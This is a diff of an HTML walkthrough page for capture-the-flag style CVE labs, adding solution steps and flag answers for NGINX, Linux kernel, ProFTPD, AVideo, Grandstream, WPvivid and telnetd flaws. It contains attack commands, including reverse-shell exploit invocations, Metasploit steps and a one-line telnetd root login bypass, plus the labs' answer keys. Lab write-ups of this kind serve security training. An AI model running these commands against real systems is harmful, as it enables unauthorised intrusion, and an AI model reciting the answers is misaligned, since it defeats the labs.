@@ -43,18 +43,21 @@ What is the secret inside the <code>/root/secret.txt</code> file?</p>
 <p class="mb-5"><strong>Answer:</strong> Oblivion</p>
 <br />
 
+
 <h4 class="mb-2">2. NGINX Rewrite Module RCE via Heap Buffer Overflow (CVE-2026-42945)</h4>
 <p class="mb-3">NGINX is a widely used open-source web server, reverse proxy, load balancer, and HTTP cache commonly deployed in front of web applications and infrastructure services. This laboratory contains the CVE-2026-42945 vulnerability affecting NGINX Open Source and NGINX Plus under specific rewrite configuration conditions. The vulnerability is rated Critical with a CVSS score of 9.2. The flaw exists in the <code>ngx_http_rewrite_module</code> when a <code>rewrite</code> directive is followed by another <code>rewrite</code>, <code>if</code>, or <code>set</code> directive, uses an unnamed PCRE capture such as <code>$1</code> or <code>$2</code>, and includes a question mark (<code>?</code>) in the replacement string. An unauthenticated attacker can send crafted HTTP requests that trigger a heap buffer overflow in the NGINX worker process.
 
 In normal environments, successful exploitation may cause the worker process to crash or restart, resulting in denial of service. In environments where ASLR is disabled or predictable, code execution may also be possible.</p>
 
 <p class="mb-3">What is the secret in the <code>/secret.txt</code> file?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-3129</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image1.png" alt="CVE-2021-3129 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image2.png" alt="CVE-2021-3129 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>First we need to run <code>nmap -sC -sV -A -p- [target_IP]</code> to identify which ports the target's NGINX uses.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42945/cvelabs_cve-2026-42945_image1.png" alt="CVE-2026-42945 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Then we create a Python script file named <code>nginx-rift.py</code> and paste <a href="https://github.com/DepthFirstDisclosures/Nginx-Rift/blob/main/poc.py" target="_blank" rel="noopener noreferrer">DepthFirst's Nginx-Rift PoC exploit code from here</a>.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42945/cvelabs_cve-2026-42945_image2.png" alt="CVE-2026-42945 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Notice that when we run <code>python3 nginx-rift.py --host 172.20.5.12 --port 80 --listen-ip 172.20.5.198 --cmd [commands]</code>, we can see that our attempt crashed. To prevent this, we need to run the exploit not as a bind shell but as a reverse shell by using <code>python3 nginx-rift.py --host 172.20.5.12 --port 80 --listen-ip 172.20.5.198 --shell</code>. This will open an interactive shell allowing us to execute commands.</p>
+<p class="mb-5"><strong>Answer:</strong> Harpocrates</p>
 <br />
+
 
 <h4 class="mb-2">3. Copy Fail – Linux Kernel Local Privilege Escalation (CVE-2026-31431)</h4>
 <p class="mb-3">This laboratory demonstrates a high-severity vulnerability identified as Copy Fail (CVE-2026-31431). The flaw is a direct logic error in the Linux kernel's <code>algif_aead</code> interface, introduced in 2017 via commit <code>72548b093ee3</code>. The <code>authencesn</code> algorithm uses a 4-byte area as scratch space during processing; due to this vulnerability, these 4 bytes are written directly into the page cache (the in-memory copy) of the target file. By chaining <code>AF_ALG</code> sockets with the <code>splice()</code> system call, an unprivileged local user can trick the kernel into performing this 4-controlled-byte write into the read-only memory of setuid binaries (such as <code>/usr/bin/su</code>), gaining root access within seconds without modifying the physical file on disk.
@@ -72,14 +75,11 @@ SSH password: <code>guest</code>
 <br />
 What is the secret inside the <code>/root/secret.txt</code> file?
 </p>
-<!-- <p class="mb-3"><strong>Steps: </strong>First we need to perform a simple Nmap scan to identify which ports are open on the target machine.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image1.png" alt="CVE-2021-42013 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Then we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2021-42013</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image2.png" alt="CVE-2021-42013 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set RPORT 80</code>, <code>set SSL false</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Once the Meterpreter session open and we simply run <code>shell</code> and then <code>cat /secret.txt</code> to obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image3.png" alt="CVE-2021-42013 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>Once we login via SSH with the given credentials, we create a Python script file named <code>copy-fail.py</code> and paste <a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py" target="_blank" rel="noopener noreferrer">Theori's Copy Fail PoC exploit code from here</a>. Then we run <code>python3 copy-fail.py</code> and we should now have our privileges escalated.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-31431/cvelabs_cve-2026-31431_image1.png" alt="CVE-2026-31431 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Lumos</p>
 <br />
+
 
 <h4 class="mb-2">4. ProFTPD Authentication Bypass & Remote Code Execution (CVE-2026-42167)</h4>
 <p class="mb-3">ProFTPD is a highly configurable open-source FTP server.
@@ -87,14 +87,15 @@ What is the secret inside the <code>/root/secret.txt</code> file?
 In versions prior to 1.3.9 using the <code>mod_sql</code> module, a critical logical vulnerability (CVE-2026-42167) exists in the <code>is_escaped_text()</code> function. The flaw allows attackers to bypass SQL character escaping by providing inputs that start and end with a single quote. This can lead to unauthenticated authentication bypass or, when combined with a PostgreSQL backend, stacked query injection to achieve Remote Code Execution (RCE) via the <code>COPY FROM PROGRAM</code> directive.
 
 Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>First we run <code>nmap -sC -sV -A [target_IP]</code> to see which port ProFTPD uses.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image1.png" alt="CVE-2026-42167 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3"> Then we run <code>vi exploit.py</code> and paste <a href="https://github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc/blob/main/pocs/preauth_user_rce.py" target="_blank" rel="noopener noreferrer">ZeroPathAI's PoC exploit code from here</a>.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image2.png" alt="CVE-2026-42167 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Next, we run <code>python3 exploit.py --host [target_IP] --port 2121 --shell-host [local_IP]</code> and a shell will appear, allowing us to execute commands.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-42167/cvelabs_cve-2026-42167_image3.png" alt="CVE-2026-42167 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Jupiter</p>
 <br />
+
 
 <h4 class="mb-2">5. AVideo Encoder getImage.php Command Injection (CVE-2026-29058)</h4>
 <p class="mb-3">AVideo is an open-source video-sharing platform solution.
@@ -102,14 +103,13 @@ Exploit the vulnerability to read the <code>/secret.txt</code> file inside the s
 In versions of AVideo Encoder prior to 7.0, there is an unauthenticated OS Command Injection vulnerability (CVE-2026-29058) caused by the improper sanitization of the <code>base64Url</code> GET parameter located in the <code>objects/getImage.php</code> endpoint. This vulnerability allows attackers to directly execute injected shell commands on the server.
 
 Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2026-29058</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-29058/cvelabs_cve-2026-29058_image1.png" alt="CVE-2026-29058 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-29058/cvelabs_cve-2026-29058_image2.png" alt="CVE-2026-29058 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open and we use <code>shell</code> to execute commands to read <code>/secret.txt</code>.</p>
+<p class="mb-5"><strong>Answer:</strong> Pandora</p>
 <br />
+
 
 <h4 class="mb-2">6. Grandstream GXP1600 Unauthenticated Remote Code Execution (CVE-2026-2329)</h4>
 <p class="mb-3">The Grandstream GXP1600 series is a widely used VoIP (Voice over IP) desktop phone solution designed for businesses and small offices to handle voice communications.
@@ -117,14 +117,13 @@ Exploit the vulnerability to read the <code>/secret.txt</code> file inside the s
 The web management interface of these devices contains a critical stack-based buffer overflow vulnerability in the <code>/cgi-bin/api.values.get</code> endpoint that does not require authentication. Attackers can exploit this vulnerability to execute arbitrary code remotely (RCE) with root privileges on the device.
 
 Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the hidden information inside the file?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2026-2329</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-2329/cvelabs_cve-2026-2329_image1.png" alt="CVE-2026-2329 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we use <code>shell</code> to execute commands to read the file contents.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-2329/cvelabs_cve-2026-2329_image2.png" alt="CVE-2026-2329 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Europa</p>
 <br />
+
 
 <h4 class="mb-2">7. WPvivid Backup & Migration Plugin Unauthenticated Remote Code Execution (CVE-2026-1357)</h4>
 <p class="mb-3">WPvivid Backup & Migration is a popular WordPress plugin used for backups, restorations, and site migrations.
@@ -132,14 +131,11 @@ Exploit the vulnerability to read the <code>/secret.txt</code> file on the serve
 This laboratory covers a critical vulnerability found in versions <= 0.9.123. The issue resides in the "Auto-Migration" functionality, which fails to properly validate incoming requests when the migration endpoint is active. Unauthenticated attackers can bypass authentication, use path traversal to upload arbitrary PHP files, and execute system commands.
 
 Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>First we run <code>vi cve-2026-1357-exploit.py</code> and paste <a href="https://github.com/halilkirazkaya/CVE-2026-1357/blob/main/exploit.py" target="_blank" rel="noopener noreferrer">halilkirazkaya's PoC exploit code from here</a>. Then we run <code>python3 cve-2026-1357-exploit.py -u http://target_IP -s "cat /secret.txt"</code>.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-1357/cvelabs_cve-2026-1357_image1.png" alt="CVE-2026-1357 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Aether</p>
 <br />
+
 
 <h4 class="mb-2">8. GNU Inetutils Telnetd Authentication Bypass (CVE-2026-24061)</h4>
 <p class="mb-3">GNU Inetutils <code>telnetd</code> is a widely used daemon that provides remote command-line access.
@@ -158,13 +154,9 @@ USER='-f root' telnet -a <TARGET_IP>
 ```
 
 <p class="mb-3">Exploit the vulnerability to gain root access. Read the <code>/secret.txt</code> file. What is the secret content?</p>
-<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
-<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
-<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>Using the command <code>USER='-f root' telnet -a [TARGET_IP]</code> directly makes us root user on the target machine, which allows us to read the file.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2026/cve-2026-24061/cvelabs_cve-2026-24061_image1.png" alt="CVE-2026-24061 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Poseidon</p>
 
 
 <hr />
